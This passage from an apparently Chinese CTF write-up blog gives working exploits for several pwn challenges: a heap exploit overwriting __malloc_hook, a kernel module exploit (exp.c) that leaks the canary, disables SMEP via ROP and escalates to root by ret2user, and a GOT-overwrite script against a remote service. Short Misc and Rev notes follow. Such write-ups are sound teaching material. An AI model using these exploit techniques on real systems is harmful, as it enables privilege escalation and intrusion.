class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        run(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x98</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x98</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        dele(<span class="number">3</span>+<span class="number">2</span>)</span><br><span class="line">        change(<span class="number">3</span>+<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0xa0</span> +<span class="number">0x70</span>) + p64(<span class="number">0xa0</span>))</span><br><span class="line">        dele(<span class="number">4</span>+<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x98</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        change(<span class="number">1</span>+<span class="number">2</span>, <span class="number">0x200</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x98</span> + p64(<span class="number">0x71</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">        dele(<span class="number">2</span>+<span class="number">2</span>)</span><br><span class="line">        change(<span class="number">0</span>+<span class="number">2</span>, <span class="number">0x200</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x98</span> + p64(<span class="number">0x111</span>))</span><br><span class="line">        dele(<span class="number">2</span> + <span class="number">2</span>)</span><br><span class="line">        change(<span class="number">1</span>, <span class="number">0x200</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x98</span> + p64(<span class="number">0x71</span>) + <span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x2b</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfbad3c80</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0</span>))</span><br><span class="line">        rn(<span class="number">0x40</span>)</span><br><span class="line">        libc.address = un64(rn(<span class="number">6</span>)) -<span class="number">0x3c5600</span></span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">        <span class="keyword">if</span> libc.address &amp; <span class="number">0xfff</span> != <span class="number">0</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        dele(<span class="number">2</span>)</span><br><span class="line">        change(<span class="number">0</span>, <span class="number">0x200</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x98</span> + p64(<span class="number">0x71</span>) + p64(libc.address +<span class="number">0x3c4aed</span>))</span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        one = libc.address +<span class="number">0x4526a</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xb</span> + p64(one) + p64(libc.address +<span class="number">0x846CB</span>))</span><br><span class="line">        sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        dbg(<span class="string">&quot;b*&quot;</span> + <span class="built_in">hex</span>(one))</span><br><span class="line">        sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        rc()</span><br><span class="line">        sl(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">        rc()</span><br><span class="line">        shell()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure></p>
<h3 id="babyhacker"><a href="#babyhacker" class="headerlink" title="babyhacker"></a>babyhacker</h3><p>flag就在<code>iniramfs.cpio</code>中，打开就能看到</p>
<h3 id="babyhacker2"><a href="#babyhacker2" class="headerlink" title="babyhacker2"></a>babyhacker2</h3><p>size比较可以设为负数，buffersize只取两个字节<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">getsize</span><span class="params">(<span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)arg &gt;= <span class="number">11</span> )</span><br><span class="line">    LOWORD(arg) = <span class="number">10</span>;</span><br><span class="line">  buffersize = arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000000E0 ; void __fastcall getsize(unsigned __int64 arg)</span><br><span class="line">.text:00000000000000E0                 public getsize</span><br><span class="line">.text:00000000000000E0 getsize         proc near               ; DATA XREF: __mcount_loc:0000000000000200↓o</span><br><span class="line">.text:00000000000000E0 arg = rdi                               ; unsigned __int64</span><br><span class="line">.text:00000000000000E0                 call    __fentry__</span><br><span class="line">.text:00000000000000E5                 push    rbp</span><br><span class="line">.text:00000000000000E6                 cmp     edi, 0Bh</span><br><span class="line">.text:00000000000000E9                 mov     eax, 0Ah</span><br><span class="line">.text:00000000000000EE                 cmovge  edi, eax</span><br><span class="line">.text:00000000000000F1                 mov     rbp, rsp</span><br><span class="line">.text:00000000000000F4                 mov     cs:buffersize, di</span><br><span class="line">.text:00000000000000FB                 pop     rbp</span><br><span class="line">.text:00000000000000FC                 retn</span><br><span class="line">.text:00000000000000FC getsize         endp</span><br></pre></td></tr></table></figure><br>用一个低位为0xFFF的负数即可给予buffersize一个比较大的正数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyhacker_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  file *rdx1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">signed</span> __int16 v5; <span class="comment">// di</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v9 = v3;</span><br><span class="line">  v5 = (<span class="type">signed</span> __int16)rdx1;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30001u</span>:</span><br><span class="line">      babyhacker_ioctl_0(rdx1, <span class="number">0x30001u</span>, (<span class="type">unsigned</span> __int64)rdx1, (__int64)&amp;v9);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30002u</span>:</span><br><span class="line">      copy_to_user(rdx1, v4, buffersize);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30000u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)rdx1 &gt;= <span class="number">11</span> )</span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">      buffersize = v5;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>利用<code>0x30002</code>读取栈上数据，得到<code>canary</code>与<code>kernel base</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall babyhacker_ioctl_0@&lt;rax&gt;(file *file@&lt;rdi&gt;, <span class="type">unsigned</span> <span class="type">int</span> cmd@&lt;esi&gt;, <span class="type">unsigned</span> __int64 arg@&lt;rdx&gt;, __int64 a4@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v7 = a4;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  result = copy_from_user(v4, file, buffersize);</span><br><span class="line">  __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>利用<code>0x30001</code>栈溢出，布置ROPCHAIN实现ret2user<br>exp.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -static -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> payload[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">char</span> padding[<span class="number">0x144</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> payload_len = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> user_stack = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> commit_creds;</span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %3\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %4\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq\n&quot;</span></span><br><span class="line">        :</span><br><span class="line">        :  <span class="string">&quot;r&quot;</span> (user_ss), <span class="string">&quot;r&quot;</span> (user_stack), <span class="string">&quot;r&quot;</span> (user_rflags), <span class="string">&quot;r&quot;</span> (user_cs), <span class="string">&quot;r&quot;</span> (&amp;launch_shell)</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">join_data</span><span class="params">(<span class="type">long</span> <span class="type">long</span> data)</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, &amp;data, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload + payload_len, buf, <span class="number">8</span>);</span><br><span class="line">    payload_len += <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">join_str</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload + payload_len, buf, len);</span><br><span class="line">    payload_len += len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    signal(SIGSEGV, launch_shell);</span><br><span class="line">    save_state();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/babyhacker&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,fd);</span><br><span class="line">    ioctl(fd, <span class="number">0x30000</span>, <span class="number">0xf0000fff</span>);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *buf=(<span class="type">long</span> <span class="type">long</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span>(buf==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ret=buf[<span class="number">0x2a</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> base = ret - <span class="number">0xffffffff81219218</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> canary=buf[<span class="number">0x28</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> poprdi = base + <span class="number">0xffffffff8109054d</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> rdi2cr4 = base + <span class="number">0xffffffff81004d70</span>;</span><br><span class="line">    prepare_kernel_cred = base + <span class="number">0xffffffff810a1820</span>;</span><br><span class="line">    commit_creds = base + <span class="number">0xffffffff810a1430</span>;</span><br><span class="line">    user_stack=&amp;poprdi;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n%p\n&quot;</span>,canary, ret);</span><br><span class="line">    <span class="built_in">memset</span>(padding, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x140</span>);</span><br><span class="line">    join_str(padding);</span><br><span class="line">    join_data(canary);</span><br><span class="line">    join_data(<span class="number">1</span>); <span class="comment">// rbp</span></span><br><span class="line">    join_data(poprdi);</span><br><span class="line">    join_data(<span class="number">0x6f0</span>);</span><br><span class="line">    join_data(rdi2cr4);</span><br><span class="line">    join_data(user_stack+<span class="number">0x200</span>);</span><br><span class="line">    join_data(&amp;get_root);</span><br><span class="line">    ioctl(fd, <span class="number">0x30001</span>, payload);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0xffffffff81219218</span></span><br><span class="line"><span class="comment">0xffffffff81004d70 : mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="comment">0xffffffff8109054d : pop rdi ; ret</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><br>利用musl-gcc可以编译出很小的静态链接程序</p>
<h3 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h3><p>索引可以为负数，通过<code>Elf64_Rela</code>结构体的GOT表值来泄漏libc与修改GOT表，改free为system执行submit即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">file = <span class="string">&#x27;./hw&#x27;</span></span><br><span class="line">e = ELF(file)</span><br><span class="line">libc = e.libc</span><br><span class="line">rlibc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;121.37.167.199&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;9997&#x27;</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">code=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">global</span> debug</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    gdb.attach(p, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">local</span>):</span><br><span class="line">    <span class="keyword">global</span> p, libc, debug</span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        p = process(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">        debug = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> rlibc != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            libc = ELF(rlibc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">rc = <span class="keyword">lambda</span>: p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">shell = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">un64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">un32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">run(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># -1879</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:\n&quot;</span>, <span class="string">&quot;20&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:\n&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">s</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:\n&quot;</span>, <span class="string">&quot;-1879&quot;</span>)</span><br><span class="line">    sea(<span class="string">&quot;:\n&quot;</span>, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:\n&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:\n&quot;</span>, <span class="string">&quot;-1879&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">dele()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;hw:\n&quot;</span>)</span><br><span class="line">libc.address = un64(rn(<span class="number">6</span>)) - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">add()</span><br><span class="line"><span class="comment"># dbg(&quot;b*0x0000000000401487&quot;)</span></span><br><span class="line">modify(p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">dbg(<span class="string">&quot;b*0x00000000004016DA&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h3><h3 id="简单MISC"><a href="#简单MISC" class="headerlink" title="简单MISC"></a>简单MISC</h3><p>解压photo.jpg得到一串摩尔斯码，解码得到flag.zip的解压密码，再解base64</p>
<h3 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h3><p>压缩包伪加密，解压发现音频，结尾和开头处有电话按键音，为DTMF信号，分析一下频率就好最后得到号码为187485618521,二维码那个图片结尾16进制说flag用base64提交</p>
<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="fxck"><a href="#fxck" class="headerlink" title="fxck!"></a>fxck!</h3><p>题目有两个重要函数一个是400C3A和400A56。</p>
